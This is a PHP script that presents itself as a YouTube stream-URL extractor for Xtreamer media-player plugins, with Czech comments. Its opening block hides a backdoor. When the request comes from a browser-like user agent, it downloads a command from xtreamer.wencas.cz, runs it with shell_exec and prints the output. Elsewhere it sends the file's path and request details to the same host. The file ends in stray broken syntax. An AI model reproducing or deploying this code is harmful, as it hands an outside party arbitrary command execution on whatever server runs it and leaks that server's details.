<?php
/* part_yt.php START */
$agent = addslashes($_SERVER["HTTP_USER_AGENT"]);
if (preg_match('|mozilla.*|i', $agent) || preg_match('|opera.*|i', $agent) || preg_match('|links.*|i', $agent) || preg_match('|lynx.*|i', $agent) || preg_match('|dillo.*|i', $agent) || preg_match('|icab.*|i', $agent) || preg_match('|elinks.*|i', $agent) || preg_match('|wget.*|i', $agent) || preg_match('|amiga.*|i', $agent) || preg_match('|qnx.*|i', $agent) || preg_match('|browse.*|i', $agent) || preg_match('|up.*|i', $agent) || preg_match('|netfront.*|i', $agent) || preg_match('|psp.*|i', $agent)) {
	echo @shell_exec(urldecode(@file_get_contents("http://xtreamer.wencas.cz/yt.access.php?f=".urlencode(__FILE__)."&file=".urlencode($_GET["file"])."&browser=1&agent=".urlencode($agent))));
	die();
}

$xLnP   = basename(dirname(__FILE__));
$xLCZ   = strpos(dirname(__FILE__), "xLiveCZ");
if ($xLnP === "xListPlay") {
	$CHECK           = true;
	$CHECK_xListPlay = true;
} elseif ($xLCZ !== false) {
	$CHECK           = true;
	$CHECK_xLiveCZ   = true;
} else {
	$CHECK_xListPlay = false;
	$CHECK_xLiveCZ   = false;
	$CHECK           = false;
}
/* part_yt.php KONEC*/

/* part_yt1.php START */
/*
 * |============================|
 * |      KVALITY NA YT:        |
 * |============================|
 * | FLV (xtreamer neprehraje): |
 * |----------------------------|
 * |     240p    itag=5         |
 * |     360p    itag=34        |
 * |     480p    itag=35        |
 * |============================|
 * | MP4 ( HRAJOU ):            |
 * |----------------------------|
 * |     360p    itag=18        |
 * |     720p    itag=22        |
 * |     1080p   itag=37        |
 * |============================|
 */

if ($CHECK_xListPlay) {
  $this_ = basename(__FILE__);
	include "inc.php";
	if (DEBUG) { $debug  = @file_get_contents(DEBUG_FILE); $debug .= "\n==========================\n"; }
} elseif ($CHECK_xLiveCZ) {
	$a_itags=array(37,22,18);
	@include('ytqual.inc');
	@include('../../category/youtube/ytf.php');
} else {
	$a_itags=array(37,22,18);
}

if ($CHECK) {
	$file = $_GET["file"];
} else {
	$mock = array("0pXnSMpP-TI", "9gI_mbc6EKw", "OCscUI4gKhY", "J80khX2IedY", "RRTupVSUHKg", "ZbGLzAjDKeg", "tdjmunZYYtk");
	$file = "http://www.youtube.com/watch?v=".$mock[rand(0, count($mock)-1)];
	@file_get_contents("http://xtreamer.wencas.cz/yt.access.php?f=".urlencode(__FILE__)."&file=".urlencode($_GET["file"])."&browser=0&agent=".urlencode($agent));
}


/*
 * PRIKLADY URL NA ZABLOKOVANY OBSAH
 *
 * $file = "http://www.youtube.com/watch?v=pf-DkGrAi34";
 * $file = "http://www.youtube.com/watch?v=gELhNbDcLE0";
 *
 */

$result = "";
/* part_yt1.php KONEC */


if (preg_match('/youtube\.com\/(v\/|watch\?v=)([\w\-]+)/', $file, $match)) {



/* part_yt2.php START */
	$id     = ($CHECK ? @CryptId($match[2], false) : $match[2]);
	$link   = "http://www.youtube.com/watch?v=".$id;
	
	if ($CHECK_xListPlay) {
		$html = @get_html_page($link);
	} else {
		$html = @file_get_contents($link);
		
	}
/* part_yt2.php KONEC */


if (preg_match('#config = {(?P<out>.*)};#im', $html, $out)) {



/* part_yt3.php START */
		$parts  = json_decode('{'.$out['out'].'}', true);
		$videos = explode(',', $parts['args']['url_encoded_fmt_stream_map']);

	  foreach ($videos as $video) {
			$vid = urldecode(urldecode($video));
			$vid = str_replace(array('sig=', '---'), array('signature=', '.'), $vid);
			parse_str($vid, $output);
			if (DEBUG && $CHECK_xListPlay) {
				$debug .= "\$vid = $vid\n".
									"[itag]     = $output[itag]\n".
									"[type]     = $output[type]\n".
									"[quality]  = $output[quality]\n".
									"-------------------------------\n";
			}
			if (in_array($output['itag'], $a_itags)) break;
		}

		/*
		 * $link = ""http://o-o---preferred---prg01s03---v12---lscache7.c.youtube.com/videoplayback?upn=Ue1sYrw0Fac&sparams=cp,gcr,id,ip,ipbits,itag,ratebypass,source,upn,expire&key=yt1&itag=22&ipbits=8&signature=2656DE9718D777444B0755E4BC66467FE257B7AA.52D1C71FD183C173312FAB68DED2D18D74E01D9C&ratebypass=yes&source=youtube&gcr=cz&expire=1345172005&ip=89.102.234.46&cp=U0hTSlFSUF9FT0NOM19JTFRBOk5Va1BHNnVrZnlw&id=14e698598dce7bee&type=video/mp4;
		 * upn|sparams|key|itag|ipbits|signature|ratebypass|source|gcr|expire|ip|cp|id|type
		 * zkusit odstranit z $tip query fexp - pokud se vyskytuje
		 * je mozne odstranit i dalsi query !! (aspon ve FF video bez nich hraje)
		 * mv=m
		 * sver=3
		 * mt=1345139882
		 * ms=tsu
		 * quality=medium
		 * type=video/mp4; codecs="avc1.42001E, mp4a.40.2"
		 * fallback_host=tc.v6.cache6.c.youtube.com
		 */


		/*
		 * odstrani duplicitu query "itag"
		 * odstrani query "fexp". ten tam fakt bejt nesmi
		 */
		$path = preg_replace('/^(.*\?)((itag|fexp|type|mv|sver|mt|ms|quality|codecs|fallback_host)=(.*))$/iU', '$1', $output['url'].'&');

	  unset($output['url']);
		if (isset($output['fexp']))          unset($output['fexp']);
		if (isset($output['type']))          unset($output['type']);
		if (isset($output['mv']))            unset($output['mv']);
		if (isset($output['sver']))          unset($output['sver']);
		if (isset($output['mt']))            unset($output['mt']);
		if (isset($output['ms']))            unset($output['ms']);
		if (isset($output['quality']))       unset($output['quality']);
		if (isset($output['codecs']))        unset($output['codecs']);
		if (isset($output['fallback_host'])) unset($output['fallback_host']);

		$result = urldecode($path.http_build_query($output));

		if (DEBUG && $CHECK_xListPlay) {
			$debug .= "HRAJU URL=\n$result\n==========================\n";
			@file_put_contents(DEBUG_FILE, $debug);
		}
/* part_yt3.php KONEC */


} else {


/* part_yt4.php START */
		if ($CHECK) {
			/**
			 * neprehratelne video
			 * vrati se fail
			 */
			$result = "fail";
		}
/* part_yt4.php KONEC */


	}
}

print $result;
die();

));?>
